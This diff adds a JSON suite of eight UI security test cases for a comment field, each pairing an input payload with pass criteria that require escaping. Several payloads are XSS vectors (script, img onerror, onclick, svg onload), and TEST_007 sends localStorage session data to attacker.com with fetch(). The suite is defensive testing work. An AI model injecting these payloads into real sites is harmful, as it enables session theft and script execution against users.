@@ -1,0 +1,217 @@
+{
+  "test_suite": "UI Security Vulnerability Test Cases",
+  "version": "1.0",
+  "test_cases": [
+    {
+      "test_id": "TEST_001",
+      "test_name": "Normal Input - Safe Rendering",
+      "category": "normal_input",
+      "description": "Verify that safe, benign user input renders correctly without any security issues",
+      "input_payload": "Hello World, this is a test comment!",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080"
+      },
+      "expected_behavior": "Input should render exactly as provided in DOM without HTML parsing",
+      "pass_criteria": [
+        "Text appears in DOM with proper escaping",
+        "No DOM injections occur",
+        "Rendering time < 100ms",
+        "No console errors or warnings"
+      ],
+      "attack_vector": "none"
+    },
+    {
+      "test_id": "TEST_002",
+      "test_name": "Reflected XSS - Script Alert",
+      "category": "reflected_xss",
+      "description": "Attempt to inject JavaScript via form input that would execute an alert dialog",
+      "input_payload": "<script>alert('XSS_VULNERABILITY_DETECTED')</script>",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080"
+      },
+      "expected_behavior": "Script should NOT execute; payload should be rendered as escaped text",
+      "pass_criteria": [
+        "No alert() dialog appears",
+        "Script tag visible as text in rendered output",
+        "No JavaScript execution in browser console",
+        "HTML special characters are escaped (&lt;, &gt;, etc.)"
+      ],
+      "attack_vector": "reflected_xss",
+      "vulnerability_type": "XSS"
+    },
+    {
+      "test_id": "TEST_003",
+      "test_name": "DOM XSS - innerHTML Injection",
+      "category": "dom_xss",
+      "description": "Inject malicious payload designed to exploit unsafe innerHTML or direct DOM manipulation",
+      "input_payload": "<img src=x onerror=\"alert('DOM_XSS_EXECUTED')\">",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080"
+      },
+      "expected_behavior": "onerror event should NOT fire; img tag should not load malicious handler",
+      "pass_criteria": [
+        "No alert() dialog appears",
+        "onerror handler is not attached or is sanitized",
+        "Image load error does not trigger JavaScript execution",
+        "DOM inspection shows safe HTML structure"
+      ],
+      "attack_vector": "dom_xss",
+      "vulnerability_type": "DOM XSS"
+    },
+    {
+      "test_id": "TEST_004",
+      "test_name": "Secrets Exposure - API Key Detection",
+      "category": "secrets_exposure",
+      "description": "Verify that hardcoded API keys, tokens, or sensitive data are not exposed in DOM, localStorage, or console",
+      "input_payload": "test_input",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080",
+        "check_secrets": true
+      },
+      "expected_behavior": "API keys, tokens, and secrets should never be visible in frontend code, DOM, or browser storage",
+      "pass_criteria": [
+        "No API_KEY variable in global scope (window object)",
+        "No JWT tokens in localStorage or sessionStorage",
+        "No secret keys in HTML source code or comments",
+        "Console does not log sensitive information",
+        "No environment variables leaked in frontend bundles"
+      ],
+      "secrets_to_check": [
+        "API_KEY",
+        "SECRET_TOKEN",
+        "DB_PASSWORD",
+        "JWT_SECRET",
+        "ADMIN_PASSWORD"
+      ],
+      "attack_vector": "secrets_exposure",
+      "vulnerability_type": "Information Disclosure"
+    },
+    {
+      "test_id": "TEST_005",
+      "test_name": "Malformed Input - Special Characters & Encoding",
+      "category": "edge_case",
+      "description": "Test handling of edge cases: very long strings, special HTML characters, URL encoding, unicode",
+      "input_payload": "\"'<>&%${}<>~!@#$%^&*()_+-=[]{}|;:',\\\"/><script>alert(1)</script>&lt;svg/onload=alert(1)&gt;\\u003cscript\\u003ealert('unicode')\\u003c/script\\u003e",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080"
+      },
+      "expected_behavior": "All special characters and encoded scripts should be properly escaped; no JavaScript execution",
+      "pass_criteria": [
+        "Input renders without truncation or data loss",
+        "No JavaScript execution from encoded payloads",
+        "Unicode entities are properly handled",
+        "Page remains responsive and does not crash",
+        "No DOM XSS from url-encoded or HTML-encoded payloads"
+      ],
+      "attack_vector": "edge_case_encoding",
+      "vulnerability_type": "XSS via Encoding"
+    },
+    {
+      "test_id": "TEST_006",
+      "test_name": "Event Handler Injection - onclick",
+      "category": "dom_xss",
+      "description": "Attempt to inject event handlers via HTML attributes",
+      "input_payload": "<div onclick=\"alert('onclick_executed')\">Click me</div>",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080"
+      },
+      "expected_behavior": "Event handler should not be attached; content should be rendered as plain text",
+      "pass_criteria": [
+        "No onclick handler is functional",
+        "Clicking the rendered text does not trigger alert",
+        "Event listeners are not attached to injected elements",
+        "HTML shows escaped attribute values"
+      ],
+      "attack_vector": "event_handler_injection",
+      "vulnerability_type": "DOM XSS"
+    },
+    {
+      "test_id": "TEST_007",
+      "test_name": "Data Exfiltration - localStorage Leak",
+      "category": "secrets_exposure",
+      "description": "Verify that user data in localStorage cannot be accessed or exfiltrated through injected scripts",
+      "input_payload": "<script>fetch('http://attacker.com/log?data=' + localStorage.getItem('user_session'))</script>",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080",
+        "check_network": true
+      },
+      "expected_behavior": "Script should not execute; no exfiltration requests should be made",
+      "pass_criteria": [
+        "No fetch() or XMLHttpRequest calls from injected script",
+        "No outbound HTTP requests to external domains",
+        "localStorage remains inaccessible to injected code",
+        "Network monitoring shows no data leakage"
+      ],
+      "attack_vector": "data_exfiltration",
+      "vulnerability_type": "Data Exfiltration"
+    },
+    {
+      "test_id": "TEST_008",
+      "test_name": "SVG/XML XSS - onload Payload",
+      "category": "dom_xss",
+      "description": "Test SVG-based XSS vectors which may bypass traditional XSS filters",
+      "input_payload": "<svg/onload=alert('SVG_XSS')>",
+      "input_field": "comment_box",
+      "environment": {
+        "browser": "chrome",
+        "js_enabled": true,
+        "viewport": "1920x1080"
+      },
+      "expected_behavior": "SVG onload handler should not execute; SVG should be treated as inert text",
+      "pass_criteria": [
+        "No alert dialog appears",
+        "SVG tag is not rendered as valid SVG element",
+        "onload attribute is not processed",
+        "Content is safely escaped"
+      ],
+      "attack_vector": "svg_xss",
+      "vulnerability_type": "SVG-based XSS"
+    }
+  ],
+  "metadata": {
+    "total_test_cases": 8,
+    "test_categories": [
+      "normal_input",
+      "reflected_xss",
+      "dom_xss",
+      "secrets_exposure",
+      "edge_case",
+      "event_handler_injection",
+      "data_exfiltration",
+      "svg_xss"
+    ],
+    "vulnerability_types": [
+      "XSS",
+      "DOM XSS",
+      "Information Disclosure",
+      "Data Exfiltration",
+      "SVG-based XSS"
+    ],
+    "success_threshold": {
+      "xss_mitigation": 95,
+      "secrets_exposure_fix": 100,
+      "edge_case_handling": 90
+    }
+  }
+}
